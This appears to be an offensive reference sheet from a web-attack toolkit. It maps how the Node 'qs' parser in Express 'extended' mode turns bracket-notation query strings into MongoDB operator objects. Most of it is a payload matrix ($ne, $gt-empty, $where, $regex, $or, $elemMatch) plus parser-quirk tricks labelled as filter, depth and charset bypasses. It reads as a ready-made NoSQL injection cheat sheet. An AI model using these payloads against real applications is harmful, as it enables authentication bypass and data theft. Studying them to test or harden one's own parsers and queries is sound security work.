# The `qs` carrier deep — `extended: true`'s full grammar

## `qs.parse` — the bracket grammar

```text
user=x                     → {user: "x"}
user[$ne]=x                → {user: {$ne: "x"}}
user[$ne][]=x              → {user: {$ne: ["x"]}}
user[a][b]=x               → {user: {a: {b: "x"}}}
user[]=x&user[]=y          → {user: ["x", "y"]}
user[0]=x&user[1]=y        → {user: ["x", "y"]}
user[a]=x&user[a]=y        → {user: {a: ["x", "y"]}}
user[a][]=x                → {user: {a: ["x"]}}
a[b][c][d][e]=x            → {a:{b:{c:{d:{e:"x"}}}}}   — depth 5
filter[user][$ne]=x        → {filter: {user: {$ne: "x"}}}
```

The `qs` parser builds nested objects from bracket-notation —
`injection-points.md`.

## The depth cap — default 5

```text
a[b][c][d][e]=x            → parsed (depth 5)
a[b][c][d][e][f]=x         → {a:{b:{c:{d:{e:{"[f]":"x"}}}}}} — literal key
```

Beyond `depth: 5` the rest stays a literal-string key —
`denied-conditions.md` — the deep-nest bypass needs a `depth`-aware
carrier.

## The `parameterLimit` — default 1000

```text
?a=1&b=2&...&a1001=x       → only first 1000 parsed
```

`parameterLimit` caps the pair-count — the flood-bypass.

## The `allowDots` — `a.b` nesting

```javascript
qs.parse("a.b=x", {allowDots: true})  → {a: {b: "x"}}
```

`allowDots` makes `a.b` nest — the dot-carrier —
`filter-bypass.md`.

## The `allowPrototypes` — the proto-block

```javascript
qs.parse("a[__proto__][x]=1")          → {a: {__proto__: {x: "1"}}}
qs.parse("a[__proto__][x]=1", {allowPrototypes: false})  → blocked
qs.parse("a[constructor][prototype][x]=1", {allowPrototypes: false})  → blocked
```

`qs` blocks `__proto__`/`constructor`/`prototype` by default — the
prototype-pollution carries die — `skills/web-prototype-pollution/` —
different class.

## The `charset` — the utf-8 vs iso-8859-1

```javascript
qs.parse("a=%E9", {charset: "utf-8"})        → {a: "é"}
qs.parse("a=%E9", {charset: "iso-8859-1"})   → {a: "é"}
qs.parse("a=%u1234", {charsetSentinel: true}) → unicode-sentinel
```

`charsetSentinel` — a `utf8=%26%2310003%3B` tells qs to use utf-8 —
the charset-trick — `filter-bypass.md`.

## The `arrayLimit` — the 20-element cap

```text
user[19]=x → array[20]
user[20]=x → {user: {"20": "x"}}  — becomes an object
user[999]=x → {user: {"999": "x"}}
```

`arrayLimit: 20` — indices ≥20 become OBJECT-keys — the object-vs-array
confusion — `injection-points.md`.

## The `comma` — the comma-split

```javascript
qs.parse("a=b,c", {comma: true})  → {a: ["b", "c"]}
```

`comma: true` splits on `,` — the array-carrier.

## The `decoder` — the custom-decode

```javascript
qs.parse("a=x", {decoder: (s) => decodeURIComponent(s)})
```

A custom-decoder can re-parse the value — the double-decode —
`filter-bypass.md`.

## The `delimiter` — the `&` variant

```javascript
qs.parse("a=x;b=y", {delimiter: ";"})
```

A custom-delimiter — `;` instead of `&` — `injection-points.md`.

## The `depth` — the explicit-nest

```javascript
qs.parse("a[b][c][d][e][f][g]=x", {depth: 10})
```

An explicit `depth` — the app's qs-config — the falsifier-check.

## The `plainObjects` — the `Object.create(null)`

```javascript
qs.parse("a=b", {plainObjects: true})  → {a: "b"}  — no prototype
```

`plainObjects` — `Object.create(null)` — no `__proto__` access — the
pollution-block.

## The `parseArrays` — the array-disable

```javascript
qs.parse("a[]=x", {parseArrays: false})  → {a: {"": "x"}}
```

`parseArrays: false` — `a[]` becomes an object-key — the array-block.

## The `qs` in Express — `extended: true`

```javascript
app.use(express.urlencoded({extended: true}))
app.use(bodyParser.urlencoded({extended: true}))
app.set("query parser", "extended")
app.set("query parser", "simple")       — uses node querystring — flat
```

`extended` → `qs`; `simple` → `querystring` — the carrier-decision —
`injection-points.md`.

## The `querystring` — the flat parser

```javascript
require('querystring').parse("user[$ne]=x")  → {"user[$ne]": "x"}
```

`querystring` does NOT nest — `user[$ne]` stays a literal key — the
flat-parser falsifier — `denied-conditions.md`.

## The qs-shape matrix

```text
user[$ne]=x                      → {user: {$ne: "x"}}
user[$ne][]=x                    → {user: {$ne: ["x"]}}
user[$gt]=                       → {user: {$gt: ""}}
user[$regex]=^a                  → {user: {$regex: "^a"}}
user[$where]=1                   → {user: {$where: "1"}}
$where=1                         → {$where: "1"}
$or[0][user]=admin               → {$or: [{user: "admin"}]}
$and[0][user][$ne]=x             → {$and: [{user: {$ne: "x"}}]}
a[$exists]=true                  → {a: {$exists: "true"}}
a[$exists]=1                     → {a: {$exists: "1"}}
a[$type]=2                       → {a: {$type: "2"}}
a[$size]=2                       → {a: {$size: "2"}}
a[$in][]=x&a[$in][]=y            → {a: {$in: ["x", "y"]}}
a[$nin][]=x                      → {a: {$nin: ["x"]}}
a[$all][]=x                      → {a: {$all: ["x"]}}
a[$elemMatch][b][$gt]=0          → {a: {$elemMatch: {b: {$gt: "0"}}}}
a.$ref=x                         → {a: {$ref: "x"}}       — allowDots
a[$comment]=x                    → {a: {$comment: "x"}}
```

All values arrive as STRINGS — `$exists: "true"` is a string, but
MongoDB's loose typing accepts `"true"`/`"1"` for `$exists` —
`operators.md`.

## The `$gt`-empty — `user[$gt]=`

```text
user[$gt]=  → {user: {$gt: ""}}  — any non-empty string
```

The `""`-bound — the any-nonempty bypass — `operators.md`.

## The deep-carrier — `filter[user][$ne]`

```text
filter[user][$ne]=x   → {filter: {user: {$ne: "x"}}}
where[user][$ne]=x    → {where: {user: {$ne: "x"}}}
q[user][$ne]=x        → {q: {user: {$ne: "x"}}}
query[user][$ne]=x    → {query: {user: {$ne: "x"}}}
```

The `filter`/`where`/`q`/`query`/`search`/`find`/`criteria` wrappers —
`injection-points.md`.

## The `qs` charsetSentinel — the `utf8=` marker

```text
utf8=%26%2310003%3B&user[$ne]=x    → qs sees utf8=✓ → utf-8 mode
utf8=%E2%9C%93&user[$ne]=x          → the ✓ char
```

`charsetSentinel` — the `utf8` param tells qs the encoding —
`filter-bypass.md`.
